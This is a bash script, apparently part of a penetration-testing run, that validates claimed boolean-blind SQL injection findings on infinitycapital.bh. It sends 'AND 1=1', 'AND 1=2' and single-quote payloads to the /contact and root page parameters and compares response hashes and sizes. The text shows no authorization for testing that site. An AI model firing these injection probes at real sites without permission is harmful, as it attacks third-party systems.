#!/bin/bash
# Differential validation of the CLAIMED boolean-blind SQLi cells.
# Method: md5(body)+length+status across baseline / true-cond / false-cond payloads.
# A real boolean-blind SQLi MUST produce a stable difference between AND 1=1 and AND 1=2.
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
t() {
  local url="$1" label="$2"
  local f="$WORK_PATH/tool_outputs/dv_$label"
  local res
  res=$(curl -s -A "$UA" -H "Accept: text/html" --max-time 30 -o "$f" -w "%{http_code}|%{size_download}" "$url")
  local m; m=$(md5sum "$f" | cut -d' ' -f1)
  echo "$label|$res|$m"
  sleep 4
}
echo "### /contact  cb=  (claimed SQLi) ###"
t "https://www.infinitycapital.bh/contact?cb=1"                 "c_base"
t "https://www.infinitycapital.bh/contact?cb=1%20AND%201=1"    "c_t"
t "https://www.infinitycapital.bh/contact?cb=1%20AND%201=2"    "c_f"
t "https://www.infinitycapital.bh/contact?cb=1'"               "c_sq"
echo "### /contact  x= ###"
t "https://www.infinitycapital.bh/contact?x=1"                  "x_base"
t "https://www.infinitycapital.bh/contact?x=1%20AND%201=1"     "x_t"
t "https://www.infinitycapital.bh/contact?x=1%20AND%201=2"     "x_f"
echo "### /  page= (claimed SQLi) ###"
t "https://www.infinitycapital.bh/?page=2"                     "p_base"
t "https://www.infinitycapital.bh/?page=2%20AND%201=1"         "p_t"
t "https://www.infinitycapital.bh/?page=2%20AND%201=2"         "p_f"
